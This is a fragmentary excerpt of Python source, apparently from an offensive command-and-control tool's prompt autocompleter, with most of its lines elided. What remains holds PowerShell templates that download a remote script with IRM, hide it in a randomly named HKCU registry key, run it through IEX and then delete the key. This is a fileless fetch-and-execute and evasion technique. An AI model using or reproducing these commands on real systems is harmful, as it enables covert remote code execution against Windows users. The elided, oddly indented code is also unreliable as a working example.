...
class Completer(object):
	...
	def complete(self, text, state):
		...
		# Autocomplete generate prompt command arguments
			...
			if re.search(r'payload=[\w\/\\\]{0,}', word_frag):
			...
			if Main_prompt.ready:
				...
				if cmd == 'help':					
					...
					if sessions_check[0]:
						...
						reg_polution = rf'New-Item -Path "HKCU:\SOFTWARE\{rand_key}" -Force | Out-Null;New-ItemProperty -Path "HKCU:\SOFTWARE\{rand_key}" -Name "{value_name}" -Value $(IRM -Uri {script_src} -UseBasicParsing) -PropertyType String | Out-Null;'
						exec_script = rf'(Get-ItemPropertyValue -Path "HKCU:\SOFTWARE\{rand_key}\" -Name "{value_name}" | IEX) | Out-Null'
						remove_src = rf'Remove-Item -Path "HKCU:\Software\{rand_key}" -Recurse'
